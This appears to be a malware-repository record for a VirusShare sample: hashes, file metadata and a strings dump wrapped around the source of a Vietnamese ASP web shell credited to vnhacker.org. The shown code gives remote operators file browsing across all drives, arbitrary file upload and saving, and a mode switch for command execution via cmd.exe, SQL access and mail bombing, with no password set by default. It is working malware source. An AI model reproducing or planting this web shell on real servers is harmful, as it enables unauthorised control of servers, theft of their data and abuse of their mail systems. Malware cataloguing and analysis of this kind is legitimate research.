onchange=\"frmQuick.submit()\">\n<%\n\tdim dc,d,dName,dType\n\tset dc=FSO.Drives\n\tfor each d in dc\n\t\tdName=d.DriveLetter&\":\\\"\n\t\tselect case d.DriveType\n\t\t\tcase 0 dType=\"Unknown\"\n\t\t\tcase 1 if d.driveletter=\"A\" then dType=\"&#189;\" else dType=\"&#188;\"\n\t\t\tdType=dType&\" Floppy\" 'maybe wrong\n\t\t\tcase 2 dType=\"HDD \" & FormatSize(d.TotalSize)\n\t\t\tcase 3 dType=\"Network\"\n\t\t\tcase 4\n\t\t\t\tdType=\"CD-ROM\"\n\t\t\t\tif not d.IsReady then dType=dType & \" - not ready\"\n\t\t\tcase 5\n\t\t\t\tdType=\"RAM Disk\"\n\t\tend select\n\t\tResponse.Write \"<option value=\"\"\" & dName & \"\"\"\"\n\t\tif d.DriveLetter=Ucase(Left(targetPath,1)) then Response.Write \" selected\"\n\t\tResponse.Write \">\" & dName& \" (\" & dType & \")\" & vbNewLine\n\tnext\n\tset dc=nothing\n%>\n</select>\n</form>\n<form name=frmAddress method=post action=\"<%=gURL%>\">\n<input type=hidden name=command value=OpenFolder>\n<b>A</b>ddress: <input type=text name=param value=\"<%=targetPath%>\" size=90> <input type=submit value=Go>\n</form>\n<%\nend sub\n\nsub HtmlMode()\n%>\n<table>\n<tr>\n <td>\n  <form name=frmChangeMode method=post action=\"<%=gURL%>\">\n  <input type=hidden name=command value=ChangeMode>\n  <select name=mode onchange=\"frmChangeMode.submit()\">\n   <option value=0<%if Session(\"mode\")=0 then Response.Write \" selected\"%>>FILE\n   <option value=1<%if Session(\"mode\")=1 then Response.Write \" selected\"%>>CMD\n   <option value=2<%if Session(\"mode\")=2 then Response.Write \" selected\"%>>SQL\n   <option value=3<%if Session(\"mode\")=3 then Response.Write \" selected\"%>>MAIL\n  </select>\n  </form>\n </td>\n<%\n\tif gPassword<>\"\" then\n%>\n <td>\n  <form name=frmLogout method=post action=\"<%=gURL%>\">\n  <input type=submit name=command value=Logout>\n  </form>\n </td>\n<%\n\tend if\n%>\n</tr>\n</table>\n<%\nend sub\n\n'###########################################################################################\n\nsub HtmlHeader(strTitle)\n%>\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n<title><%=strTitle%></title>\n<style>\nselect,input{font-family:Verdana;font-size:9pt}\n</style>\n</head>\n<body>\n<%\nend sub\n\n'###########################################################################################\n\nsub HtmlFooter()\n%>\n</body>\n</html>\n<%\nend sub\n\n'###########################################################################################\n\nfunction abspath(path)\n\tif left(path,1)=\":\" then abspath=Server.MapPath(mid(path,2)) else abspath=FSO.GetAbsolutePathName(path)\nend function\n\n'###########################################################################################\n\nfunction addslash(path)\n\tif right(path,1)=\"\\\" then addslash=path else addslash=path & \"\\\"\nend function\n\n'###########################################################################################\n\nfunction findroot(path)\n\tdim f\n\n\tset f=FSO.GetFolder(path)\n\n\tif f.IsRootFolder then\n\telse\n\t\tdo until f.IsRootFolder\n\t\t\tset f=f.ParentFolder\n\t\tloop\n\tend if\n\tfindroot=f.Path\n\tset f=nothing\nend function\n\n'###########################################################################################\n\nfunction isroot(path)\n\tdim f\n\tset f=FSO.GetFolder(path)\n\tisroot=f.IsRootFolder\n\tset f=nothing\nend function\n\n'###########################################################################################\n\nFunction FindLink(szFileName)\n\tDim WshShell, oLink\n\n\tSet WshShell=Server.CreateObject(\"WScript.Shell\")\n\tSet oLink=WshShell.CreateShortcut(szFileName)\n\n\tFindLink=oLink.TargetPath\n\t\n\tSet oLink=Nothing\n\tSet WshShell=Nothing\nEnd Function\n\n'###########################################################################################\n\nFunction FormatSize(intSize)\n\tIf (intSize < 1024) Then\n\t\tFormatSize = intSize & \" B\"\n\tElseIf (intSize < 1024*1024) Then\n\t\tFormatSize = FormatNumber(intSize/1024,2) & \" KB\"\n\tElseIf (intSize < 1024*1024*1024) Then\n\t\tFormatSize = FormatNumber(intSize/(1024*1024),2) & \" MB\"\n\tElse\n\t\tFormatSize = FormatNumber(intSize/(1024*1024*1024),2) & \" GB\"\n\tEnd If\nEnd Function\n\n'###########################################################################################\n\nFunction FormatName(szName)\n\tFormatName = szName\n\tIf gMax > 5 And Len(szName) > gMax Then FormatName = Left(szName,gMax-2) & \"...\"\nEnd Function\n\n'###########################################################################################\n\nfunction FormatDate(strDate)\n\tdim int12HourPart,strAMPM\n\tint12HourPart=DatePart(\"h\",strDate) mod 12\n\tif int12HourPart=0 then int12HourPart=12\n\tif DatePart(\"h\",strDate)>=12 then strAMPM=\"PM\" else strAMPM=\"AM\"\n\tFormatDate=Right(\"0\"&DatePart(\"d\",strDate),2) & \"/\" & Right(\"0\"&DatePart(\"m\",strDate),2) & \"/\" & DatePart(\"yyyy\",strDate) & \" \" &  Right(\"0\"&int12HourPart,2) & \":\" & Right(\"0\"&DatePart(\"n\",strDate),2) & \":\" & Right(\"0\"&DatePart(\"s\",strDate),2) & \" \" & strAMPM\nend function\n\n'###########################################################################################\n\nFunction GetAttributes(intAttr)\n\tDim strAttributes\n\tstrAttributes=\"\"\n\tIf (intAttr And 1) > 0 Then strAttributes = \"R\"\n\tIf (intAttr And 2) > 0 Then strAttributes=strAttributes & \"H\"\n\tIf (intAttr And 4) > 0 Then strAttributes=strAttributes & \"S\"\n\tIf (intAttr And 32) > 0 Then strAttributes=strAttributes & \"A\"\n\tIf (intAttr And 2048) > 0 Then strAttributes=strAttributes & \"C\"\n\tif strAttributes=\"\" then strAttributes=\"&nbsp;\"\n\tGetAttributes=strAttributes\nEnd Function\n\n'###########################################################################################\n\nClass clsField\n\tPublic Name\n\tPrivate mstrPath\n\tPublic FileDir\n\tPublic FileExt\n\tPublic FileName\n\tPublic ContentType\n\tPublic Value\n\tPublic BinaryData\n\tPublic Length\n\tPrivate mstrText\n\n\tPublic Property Get BLOB()\n\t\tBLOB = BinaryData\n\tEnd Property\n\n\tPublic Function BinaryAsText()\n\t\tDim lbinBytes\n\t\tDim lobjRs\n\t\tIf Length = 0 Then Exit Function\n\t\tIf LenB(BinaryData) = 0 Then Exit Function\n\t\t\n\t\tIf Not Len(mstrText) = 0 Then\n\t\t\tBinaryAsText = mstrText\n\t\t\tExit Function\n\t\tEnd If\n\t\tlbinBytes = ASCII2Bytes(BinaryData)\n   \t\tmstrText = Bytes2Unicode(lbinBytes)\n    \tBinaryAsText = mstrText\n\tEnd Function\n\n\tPublic Sub SaveAs(ByRef pstrFileName)\n\t\tConst adTypeBinary=1\n\t\tConst adSaveCreateOverWrite=2\n\t\tDim lobjStream\n\t\tDim lobjRs\n\t\tDim lbinBytes\n\t\tIf Length = 0 Then Exit Sub\n\t\tIf LenB(BinaryData) = 0 Then Exit Sub\n\t\tSet lobjStream = Server.CreateObject(\"ADODB.Stream\")\n\t\tlobjStream.Type = adTypeBinary\n\t\tCall lobjStream.Open()\n\t\tlbinBytes = ASCII2Bytes(BinaryData)\n\t\tCall lobjStream.Write(lbinBytes)\n\t\tOn Error Resume Next\n\t\tCall lobjStream.SaveToFile(pstrFileName, adSaveCreateOverWrite)\n\t\tCall lobjStream.Close()\n\t\tSet lobjStream = Nothing\n\tEnd Sub\n\n\tPublic Property Let FilePath(ByRef pstrPath)\n\t\tmstrPath = pstrPath\n\t\tIf Not InStrRev(pstrPath, \".\") = 0 Then\n\t\t\tFileExt = Mid(pstrPath, InStrRev(pstrPath, \".\") + 1)\n\t\t\tFileExt = UCase(FileExt)\n\t\tEnd If\n\t\tIf Not InStrRev(pstrPath, \"\\\") = 0 Then\n\t\t\tFileName = Mid(pstrPath, InStrRev(pstrPath, \"\\\") + 1)\n\t\tEnd If\n\t\tIf Not InStrRev(pstrPath, \"\\\") = 0 Then\n\t\t\tFileDir = Mid(pstrPath, 1, InStrRev(pstrPath, \"\\\") - 1)\n\t\tEnd If\n\tEnd Property\n\n\tPublic Property Get FilePath()\n\t\tFilePath = mstrPath\n\tEnd Property\n\n\tPrivate Function ASCII2Bytes(ByRef pbinBinaryData)\n\t\tConst adLongVarBinary=205\n\t\tDim lobjRs\n\t\tDim llngLength\n\t\tDim lbinBuffer\n\t\tllngLength = LenB(pbinBinaryData)\n\t\tSet lobjRs = Server.CreateObject(\"ADODB.Recordset\")\n\t\tCall lobjRs.Fields.Append(\"BinaryData\", adLongVarBinary, llngLength)\n\t\tCall lobjRs.Open()\n\t\tCall lobjRs.AddNew()\n\t\tCall lobjRs.Fields(\"BinaryData\").AppendChunk(pbinBinaryData & ChrB(0))\n\t\tCall lobjRs.Update()\n\t\tlbinBuffer = lobjRs.Fields(\"BinaryData\").GetChunk(llngLength)\n\t\tCall lobjRs.Close()\n\t\tSet lobjRs = Nothing\n\t\tASCII2Bytes = lbinBuffer\n\tEnd Function\n\n\tPrivate Function Bytes2Unicode(ByRef pbinBytes)\n\t\tDim lobjRs\n\t\tDim llngLength\n\t\tDim lstrBuffer\n\t\tllngLength = LenB(pbinBytes)\n\t\tSet lobjRs = Server.CreateObject(\"ADODB.Recordset\")\n    \tCall lobjRs.Fields.Append(\"BinaryData\", adLongVarChar, llngLength)\n    \tCall lobjRs.Open()\n    \tCall lobjRs.AddNew()\n    \tCall lobjRs.Fields(\"BinaryData\").AppendChunk(pbinBytes)\n    \tCall lobjRs.Update()\n    \tlstrBuffer = lobjRs.Fields(\"BinaryData\").Value\n    \tCall lobjRs.Close()\n    \tSet lobjRs = Nothing\n\t\tBytes2Unicode = lstrBuffer\n\tEnd Function\nEnd Class\n\n'###########################################################################################\n\nClass clsUpload\n\tPrivate mbinData\n\tPrivate mlngChunkIndex\n\tPrivate mlngBytesReceived\n\tPrivate mstrDelimiter\n\tPrivate CR\n\tPrivate LF\n\tPrivate CRLF\n\tPrivate mobjFieldAry()\n\tPrivate mlngCount\n\t\n\tPrivate Sub RequestData\n\t\tDim llngLength\n\t\tmlngBytesReceived = Request.TotalBytes\n\t\tmbinData = Request.BinaryRead(mlngBytesReceived)\n\tEnd Sub\n\n\tPrivate Sub ParseDelimiter()\n\t\tmstrDelimiter = MidB(mbinData, 1, InStrB(1, mbinData, CRLF) - 1)\n\tEnd Sub\n\n\tPrivate Sub ParseData()\n\t\tDim llngStart\n\t\tDim llngLength\n\t\tDim llngEnd\n\t\tDim lbinChunk\n\t\tllngStart = 1\n\t\tllngStart = InStrB(llngStart, mbinData, mstrDelimiter & CRLF)\n\t\tWhile Not llngStart = 0\n\t\t\tllngEnd = InStrB(llngStart + 1, mbinData, mstrDelimiter) - 2\n\t\t\tllngLength = llngEnd - llngStart\n\t\t\tlbinChunk = MidB(mbinData, llngStart, llngLength)\n\t\t\tCall ParseChunk(lbinChunk)\n\t\t\tllngStart = InStrB(llngStart + 1, mbinData, mstrDelimiter & CRLF)\n\t\tWend\n\tEnd Sub\n\n\tPrivate Sub ParseChunk(ByRef pbinChunk)\n\t\tDim lstrName\n\t\tDim lstrFileName\n\t\tDim lstrContentType\n\t\tDim lbinData\n\t\tDim lstrDisposition\n\t\tDim lstrValue\n\t\tlstrDisposition = ParseDisposition(pbinChunk)\n\t\tlstrName = ParseName(lstrDisposition)\n\t\tlstrFileName = ParseFileName(lstrDisposition)\n\t\tlstrContentType = ParseContentType(pbinChunk)\n\t\tIf lstrContentType = \"\" Then\n\t\t\tlstrValue = CStrU(ParseBinaryData(pbinChunk))\n\t\tElse\n\t\t\tlbinData = ParseBinaryData(pbinChunk)\n\t\tEnd If\n\t\tCall AddField(lstrName, lstrFileName, lstrContentType, lstrValue, lbinData)\n\tEnd Sub\n\n\tPrivate Sub AddField(ByRef pstrName, ByRef pstrFileName, ByRef pstrContentType, ByRef pstrValue, ByRef pbinData)\n\t\tDim lobjField\n\t\tReDim Preserve mobjFieldAry(mlngCount)\n\t\tSet lobjField = New clsField\n\t\tlobjField.Name = pstrName\n\t\tlobjField.FilePath = pstrFileName\t\t\t\t\n\t\tlobjField.ContentType = pstrContentType\n\t\tIf LenB(pbinData) = 0 Then\n\t\t\tlobjField.BinaryData = ChrB(0)\n\t\t\tlobjField.Value = pstrValue\n\t\t\tlobjField.Length = Len(pstrValue)\n\t\tElse\n\t\t\tlobjField.BinaryData = pbinData\n\t\t\tlobjField.Length = LenB(pbinData)\n\t\t\tlobjField.Value = \"\"\n\t\tEnd If\n\t\tSet mobjFieldAry(mlngCount) = lobjField\n\t\tmlngCount = mlngCount + 1\n\tEnd Sub\n\n\tPrivate Function ParseBinaryData(ByRef pbinChunk)\n\t\tDim llngStart\n\t\tllngStart = InStrB(1, pbinChunk, CRLF & CRLF)\n\t\tIf llngStart = 0 Then Exit Function\n\t\tllngStart = llngStart + 4\n\t\tParseBinaryData = MidB(pbinChunk, llngStart)\n\tEnd Function\n\n\tPrivate Function ParseContentType(ByRef pbinChunk)\n\t\tDim llngStart\n\t\tDim llngEnd\n\t\tDim llngLength\n\t\tllngStart = InStrB(1, pbinChunk, CRLF & CStrB(\"Content-Type:\"), vbTextCompare)\n\t\tIf llngStart = 0 Then Exit Function\n\t\tllngEnd = InStrB(llngStart + 15, pbinChunk, CR)\n\t\tIf llngEnd = 0 Then Exit Function\n\t\tllngStart = llngStart + 15\n\t\tIf llngStart >= llngEnd Then Exit Function\n\t\tllngLength = llngEnd - llngStart\n\t\tParseContentType = Trim(CStrU(MidB(pbinChunk, llngStart, llngLength)))\n\tEnd Function\n\n\tPrivate Function ParseDisposition(ByRef pbinChunk)\n\t\tDim llngStart\n\t\tDim llngEnd\n\t\tDim llngLength\n\t\tllngStart = InStrB(1, pbinChunk, CRLF & CStrB(\"Content-Disposition:\"), vbTextCompare)\n\t\tIf llngStart = 0 Then Exit Function\n\t\tllngEnd = InStrB(llngStart + 22, pbinChunk, CRLF)\n\t\tIf llngEnd = 0 Then Exit Function\n\t\tllngStart = llngStart + 22\n\t\tIf llngStart >= llngEnd Then Exit Function\n\t\tllngLength = llngEnd - llngStart\n\t\tParseDisposition = CStrU(MidB(pbinChunk, llngStart, llngLength))\n\tEnd Function\n\n\tPrivate Function ParseName(ByRef pstrDisposition)\n\t\tDim llngStart\n\t\tDim llngEnd\n\t\tDim llngLength\n\t\tllngStart = InStr(1, pstrDisposition, \"name=\"\"\", vbTextCompare)\n\t\tIf llngStart = 0 Then Exit Function\n\t\tllngEnd = InStr(llngStart + 6, pstrDisposition, \"\"\"\")\n\t\tIf llngEnd = 0 Then Exit Function\n\t\tllngStart = llngStart + 6\n\t\tIf llngStart >= llngEnd Then Exit Function\n\t\tllngLength = llngEnd - llngStart\n\t\tParseName = Mid(pstrDisposition, llngStart, llngLength)\n\tEnd Function\n' ------------------------------------------------------------------------------\n\tPrivate Function ParseFileName(ByRef pstrDisposition)\n\t\tDim llngStart\n\t\tDim llngEnd\n\t\tDim llngLength\n\t\tllngStart = InStr(1, pstrDisposition, \"filename=\"\"\", vbTextCompare)\n\t\tIf llngStart = 0 Then Exit Function\n\t\tllngEnd = InStr(llngStart + 10, pstrDisposition, \"\"\"\")\n\t\tIf llngEnd = 0 Then Exit Function\n\t\tllngStart = llngStart + 10\n\t\tIf llngStart >= llngEnd Then Exit Function\n\t\tllngLength = llngEnd - llngStart\n\t\tParseFileName = Mid(pstrDisposition, llngStart, llngLength)\n\tEnd Function\n\n\tPublic Property Get Count()\n\t\tCount = mlngCount\n\tEnd Property\n\n\tPublic Default Property Get Fields(ByVal pstrName)\n\t\tDim llngIndex\n\t\tIf IsNumeric(pstrName) Then\n\t\t\tllngIndex = CLng(pstrName)\n\t\t\tIf llngIndex > mlngCount - 1 Or llngIndex < 0 Then\n\t\t\t\tCall Err.Raise(vbObjectError + 1, \"clsUpload.asp\", \"Object does not exist within the ordinal reference.\")\n\t\t\t\tExit Property\n\t\t\tEnd If\n\t\t\tSet Fields = mobjFieldAry(pstrName)\n\t\tElse\n\t\t\tpstrName = LCase(pstrname)\n\t\t\tFor llngIndex = 0 To mlngCount - 1\n\t\t\t\tIf LCase(mobjFieldAry(llngIndex).Name) = pstrName Then\n\t\t\t\t\tSet Fields = mobjFieldAry(llngIndex)\n\t\t\t\t\tExit Property\n\t\t\t\tEnd If\n\t\t\tNext\n\t\tEnd If\n\t\tSet Fields = New clsField\n\tEnd Property\n\n\tPrivate Sub Class_Terminate()\n\t\tDim llngIndex\n\t\tFor llngIndex = 0 To mlngCount - 1\n\t\t\tSet mobjFieldAry(llngIndex) = Nothing\n\t\t\t\n\t\tNext\n\t\tReDim mobjFieldAry(-1)\n\tEnd Sub\n\n\tPrivate Sub Class_Initialize()\n\t\tReDim mobjFieldAry(-1)\n\t\tCR = ChrB(Asc(vbCr))\n\t\tLF = ChrB(Asc(vbLf))\n\t\tCRLF = CR & LF\n\t\tmlngCount = 0\n\t\tCall RequestData\n\t\tCall ParseDelimiter()\n\t\tCall ParseData\n\tEnd Sub\n\n\tPrivate Function CStrU(ByRef pstrANSI)\n\t\tDim llngLength\n\t\tDim llngIndex\n\t\tllngLength = LenB(pstrANSI)\n\t\tFor llngIndex = 1 To llngLength\n\t\t\tCStrU = CStrU & Chr(AscB(MidB(pstrANSI, llngIndex, 1)))\n\t\tNext\n\tEnd Function\n\n\tPrivate Function CStrB(ByRef pstrUnicode)\n\t\tDim llngLength\n\t\tDim llngIndex\n\t\tllngLength = Len(pstrUnicode)\n\t\tFor llngIndex = 1 To llngLength\n\t\t\tCStrB = CStrB & ChrB(Asc(Mid(pstrUnicode, llngIndex, 1)))\n\t\tNext\n\tEnd Function\nEnd Class\n\n'###########################################################################################\n\nClass clsZip\n\tPrivate mbin_Zip\n\tPrivate mobj_Files()\n\tPrivate mlng_Files\n\t\n\tSub ZipLoad(pstrFileName)\n\t\tDim lobjFSO\n\t\tDim llngTristateFalse\n\t\tDim llngForReading\n\t\tdim objStream\n\t\t\n\t\tmbin_Zip = \"\"\n\t\t\n\t\tIf pstrFileName = \"\" Then Exit Sub\n\n\t\tIf InStr(1, pstrFileName, \":\\\") = 0 Then\n\t\t\tpstrFileName = Server.MapPath(pstrFileName)\n\t\tEnd If\n\n\t\tSet lobjFSO = Server.CreateObject(\"Scripting.FileSystemObject\")\n\n\t\tIf lobjFSO.FileExists(pstrFileName) Then\n\t\t\tset objStream=Server.CreateObject(\"ADODB.Stream\")\n\t\t\tobjStream.Type=1\n\t\t\tobjStream.Open\n\t\t\ton error resume next\n\t\t\tobjStream.LoadFromFile(pstrFileName)\n\t\t\tmbin_Zip = objStream.Read\n\t\t\tset objStream=nothing\n\t\tEnd If\n\t\t\t\n\t\tSet lobjFSO = Nothing\n\t\t\t\n\t\tCall ParseZips()\n\n\tEnd Sub\n\t\n\tPublic Property Let ZipData(ByRef pbinBinaryData)\n\t\tmbin_Zip = pbinBinaryData\n\t\tCall ParseZips()\n\tEnd Property\n\tPublic Property Get FileCount()\n\t\tFileCount = mlng_Files\n\tEnd Property\n\tPublic Property Get GetFile(ByRef plngIndex)\n\t\tSet GetFile = mobj_Files(plngIndex-1)\n\tEnd Property\n\n\tPrivate Sub ParseZips()\n\t\tDim llngOffSet\n\t\tmlng_Files = 0\n\t\tllngOffSet = 0\n\t\tIf LenB(mbin_Zip) = 0 Then Exit Sub\n\t\tDo\n\t\t\t' Find next PK 3.04 record\n\t\t\tllngOffset = InStrB(llngOffset + 1, mbin_zip, ChrB(&h50) & ChrB(&h4B) & ChrB(&h03) & ChrB(&h04))\n\t\t\tIf llngOffset = 0 Then Exit Do\n\t\t\tllngOffset = llngOffset - 1\n\t\t\tReDim Preserve mobj_Files(mlng_Files)\n\t\t\tSet mobj_Files(mlng_Files) = New clsZipFile\n\t\t\tWith mobj_Files(mlng_Files)\n\t\t\t\t.Signature\t\t\t\t= GetString(llngOffset + 1, 2) & \" \" & CInt(GetHex(llngOffset + 3, 1)) & \".\" & GetHex(llngOffset + 4, 1)\n\t\t\t\t.ExtractVersion\t\t\t= FormatNumber(GetNumber(llngOffset + 5, 2) * .1, 1, True)\n\t\t\t\t.GeneralPurposeFlags\t= GetNumber(llngOffset + 7, 2)\n\t\t\t\t.CompressionMethod\t\t= GetNumber(llngOffset + 9, 2)\n\t\t\t\t.LastModifiedTime\t\t= GetNumber(llngOffset + 11, 2)\n\t\t\t\t.LastModifiedDate\t\t= GetNumber(llngOffset + 13, 2)\n\t\t\t\t.CRC32\t\t\t\t\t= GetNumber(llngOffset + 15, 4)\n\t\t\t\t.CompressedSize\t\t\t= GetNumber(llngOffset + 19, 4)\n\t\t\t\t.UncompressedSize\t\t= GetNumber(llngOffset + 23, 4)\n\t\t\t\t.FileNameLength\t\t\t= GetNumber(llngOffset + 27, 2)\n\t\t\t\t.ExtraFieldLength\t\t= GetNumber(llngOffset + 29, 2)\n\t\t\t\t.FileName\t\t\t\t= GetString(llngOffset + 31, .FileNameLength)\n\t\t\t\t.ExtraField\t\t\t\t= GetString(llngOffset + 31 + .FileNameLength, .ExtraFieldLength)\n\t\t\t\t.StartByte\t\t\t\t= llngOffSet + 1\n\t\t\t\t.EndByte\t\t\t\t= llngOffSET + .FileNameLength + .ExtraFieldLength + .CompressedSize + 30\n'\t\t\t\t.BinaryData\t\t\t\t= MidB(pbin_Zip, llngOffSET + .FileNameLength + .ExtraFieldLength + 30, .CompressedSize)\n'\t\t\t\t.LocalFileHeader\t\t= GetString(llngOffset + 1, .FileNameLength + .ExtraFieldLength + 30)\n\t\t\t\tllngOffSet\t\t\t\t= .EndByte\n\t\t\t\t.IsOverall\t\t\t\t= (.Name = \"\" And .Path = \"\")\n\t\t\t\t.IsFolder\t\t\t\t= (.Name = \"\" And Not .Path = \"\")\n\t\t\tEnd With\n\t\t\tmlng_Files = mlng_Files + 1\n\t\tLoop While mobj_Files(mlng_Files - 1).EndByte < LenB(mbin_zip)\n\tEnd Sub\n\t\n\tPrivate Function GetHex(plngStart, plngLength)\n\t\tDim llngIndex\n\t\tDim lstrHex\n\t\tFor llngIndex = 0 To plngLength - 1\n\t\t\tlstrHex = lstrHex & Right(\"0\" & Hex(AscB(MidB(mbin_zip, plngStart + llngIndex, 1))), 2)\n\t\tNext\n\t\tGetHex = lstrHex\n\tEnd Function\n\t\n\tPrivate Function GetString(plngStart, plngLength)\n\t\tDim llngIndex\n\t\tDim lstrString\n\t\tIf LenB(mbin_zip) < (plngStart + (plngLength - 1)) Then Exit Function\n\t\tFor llngIndex = 0 To plngLength - 1\n\t\t\tIf AscB(MidB(mbin_zip, plngStart + llngIndex, 1)) = 0 Then\n\t\t\t\tlstrString = lstrString & \" \"\n\t\t\tElse\n\t\t\t\tlstrString = lstrString & Chr(AscB(MidB(mbin_zip, plngStart + llngIndex, 1)))\n\t\t\tEnd If\n\t\tNext\n\t\tGetString = lstrString\n\tEnd Function\n\t\n\tPrivate Function GetNumber(plngStart, plngLength)\n\t\tIf plngStart < 0 Then Exit Function\n\t\tDim llngIndex\n\t\tDim lstrHex\n\t\tFor llngIndex = 0 To plngLength - 1\n\t\t\tlstrHex = Right(\"0\" & Hex(AscB(MidB(mbin_zip, plngStart + llngIndex, 1))), 2) & lstrHex\n\t\tNext\n\t\tGetNumber = CDbl(\"&h\" & lstrHex)\n\tEnd Function\n\t\n\tFunction GetDate(plngStart)\n\t\tDim llngDate\n\t\tllngDate = GetNumber(plngStart, 2)\n\t\tGetDate = DateSerial(1980 + (llngDate And &HFE00) \\ &H200, (llngDate And &H1E0) \\ &H20, llngDate And &H1F)\n\tEnd Function\n\t\n\tFunction GetTime(plngStart)\n\t\tDim llngDate\n\t\tllngDate = GetNumber(plngStart, 2)\n\t\tGetTime = TimeSerial((llngDate And &HF800) \\ &H800, (llngDate And &H7E0) \\ &H20, (llngDate And &H1F) * 2)\n\tEnd Function\nEnd Class\n\nClass clsZipFile\n\tPublic Signature\n\tPublic ExtractVersion\n\tPublic GeneralPurposeFlags\n\tPublic CompressionMethod\n\tPublic LastModifiedTime\n\tPublic LastModifiedDate\n\tPublic CRC32\n\tPublic CompressedSize\n\tPublic UncompressedSize\n\tPublic FileNameLength\n\tPublic ExtraFieldLength\n\tPublic FileName\n\tPublic ExtraField\n\tPublic StartByte\n\tPublic EndByte\n\tPublic BinaryData\n\tPublic LocalFileHeader\n\t\n\tPublic IsFolder\n\tPublic IsOverall\n\t\n\tPublic Property Get Name\n\t\tDim lstrPath\n\t\tlstrPath = Replace(FileName, \"/\", \"\\\")\n\t\tIf InStr(1, lstrPath, \"\\\") = \"0\" Then\n\t\t\tName = lstrPath\n\t\t\tExit Property\n\t\tEnd If\n\t\tName = Mid(lstrPath, InStrRev(lstrPath, \"\\\") + 1)\n\tEnd Property\n\n\tPublic Property Get Path\n\t\tDim lstrPath\n\t\tlstrPath = Replace(FileName, \"/\", \"\\\")\n\t\tIf InStr(1, lstrPath, \"\\\") = \"0\" Then\n\t\t\tPath = \"\"\n\t\t\tExit Property\n\t\tEnd If\n\t\tPath = Mid(lstrPath, 1, InStrRev(lstrPath, \"\\\"))\n\tEnd Property\n\n\tPublic Property Get Packed\n\t\tPacked = CompressedSize\n\tEnd Property\n\t\n\tPublic Property Get Ratio\n\t\tIf UncompressedSize = 0 Then Exit Property\n\t\tIf CompressedSize >= UncompressedSize Then\n\t\t\tRatio = \"0%\"\n\t\tElse\n\t\t\tRatio = FormatNumber(((1 - (CompressedSize / UncompressedSize)) * 100), 0, True, False, True) & \"%\"\n\t\tEnd If\n\tEnd Property\n\n\tPublic Property Get Modified()\n\t\tModified = CDate(GetDate(LastModifiedDate) & \" \" & GetTime(LastModifiedTime))\n\tEnd Property\n\t\n\tPrivate Function GetDate(plngDate)\n\t\tGetDate = DateSerial(1980 + (plngDate And &HFE00) \\ &H200, \t\t\t(plngDate And &H1E0) \\ &H20, plngDate And &H1F)\n\tEnd Function\n\n\tPrivate Function GetTime(plngDate)\n\t\tGetTime = TimeSerial((plngDate And &HF800) \\ &H800, \t\t\t(plngDate And &H7E0) \\ &H20, \t\t\t(plngDate And &H1F) * 2)\n\tEnd Function\n\t\n\tPublic Property Get Size()\n\t\tSize = UncompressedSize\n\tEnd Property\n\t\n\tPublic Property Get BitMask()\n\t\tDim llngNumber\n\t\tDim lstrBits\n\t\tllngNumber = GeneralPurposeFlags\n\t\tDo\n\t\t\tIf llngNumber Mod 2 = 1 Then lstrBits = \"1\" & lstrBits Else lstrBits = \"0\" & lstrBits\n\t\t\tllngNumber = llngNumber \\ 2\n\t\tLoop Until llngNumber = 0\n\t\tlstrBits = Right(\"0000000000000000\" & lstrBits, 16)\n\t\tFor llngNumber = 0 To 3\n\t\t\tlstrReturn = lstrReturn & Mid(lstrBits, (llngNumber * 4) + 1, 4) & \".\"\n\t\tNext\n\t\tBitMask = Left(lstrReturn, 19)\n\tEnd Property\n\n\tProperty Get CompressionMethodString()\n\t\tSelect Case CompressionMethod\n\t\t\tCase 0 CompressionMethodString = \"The file is stored (no compression)\"\n\t\t\tCase 1 CompressionMethodString = \"The file is Shrunk\"\n\t\t\tCase 2 CompressionMethodString = \"The file is Reduced with compression factor 1\"\n\t\t\tCase 3 CompressionMethodString = \"The file is Reduced with compression factor 2\"\n\t\t\tCase 4 CompressionMethodString = \"The file is Reduced with compression factor 3\"\n\t\t\tCase 5 CompressionMethodString = \"The file is Reduced with compression factor 4\"\n\t\t\tCase 6 CompressionMethodString = \"The file is Imploded\"\n\t\t\tCase 7 CompressionMethodString = \"Reserved for Tokenizing compression algorithm\"\n\t\t\tCase 8 CompressionMethodString = \"The file is Deflated\"\n\t\t\tCase 9 CompressionMethodString = \"Reserved for enhanced Deflating\"\n\t\t\tCase 10 CompressionMethodString = \"PKWARE Date Compression Library Imploding\"\n\t\t\tCase Else CompressionMethodString = \"Unhandled Copression type: \" & CompressionMethod\n\t\tEnd Select\n\tEnd Property\nEnd Class\n%>"
    },
    "filename": "VirusShare_0024a8f29c6498005b5a4feea91b6b5c",
    "filesize": 67547,
    "filetype": "ASCII text",
    "hashes": {
        "md5": "0024a8f29c6498005b5a4feea91b6b5c",
        "sha1": "e43acf24d4110c5797ae6b1cc0559bb56ac3313c",
        "sha256": "4e98bc5ebf991ba941fa0cbc086d173daf3afe2c1686501807d0ebea65462e12"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "' Tac gia: forever5pi (theo huong dan cua anh vicki-vkdt)",
            "' Email  : forever5pi@yahoo.com",
            "' Website: http://vnhacker.org",
            "option explicit",
            "Server.ScriptTimeout=10000",
            "Response.Buffer=false",
            "dim gURL,gMsg",
            "dim targetPath,cp_dst,mv_dst,root",
            "dim FSO,re",
            "dim zombie_array,special_array",
            "' ###################################### CONFIGURATION ######################################",
            "const gPassword=\"\" ' mat khau (\"\" : khong dung password)",
            "const gMax=50 ' chieu dai toi da cho ten file",
            "const gBomb=1000 ' so luong mail mac dinh can bomb",
            "const lnkExt=\"lnk,url\"",
            "const editExt=\"htm,html,asp,asa,txt,inc,css,aspx,js,vbs,shtm,shtml,xml,xsl,log,ini,bat,bak\" ' danh sach cac file cho phep edit",
            "const TmpDir=\"C:\\\" ' thu muc tam thoi mac dinh",
            "const Shell=\"cmd.exe\" ' shell mac dinh",
            "' cac chuoi ket noi mac dinh",
            "const cstrMSSQL\t\t= \"Provider=SQLOLEDB;Data Source=SERVER_NAME;database=DB_NAME;uid=UID;pwd=PWD\"",
            "const cstrJET\t\t= \"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=full_path/db_file.mdb\" ",
            "const cstrACCESS\t= \"DRIVER={Microsoft Access Driver (*.mdb)}; DBQ=full_path/db_file.mdb\"",
            "const cstrORACLE\t= \"Provider=OraOLEDB.Oracle.1; Data Source=DB_NAME; User ID=UID; Password=PWD\"",
            "const cstrMYSQL\t\t= \"Driver=MySQL;server=SERVER_IP;uid=UID;pwd=PWD;database=DB_NAME\"",
            "const cstrDSN\t\t= \"DSN_NAME\"",
            "const bSize=false' co/khong hien folder-size",
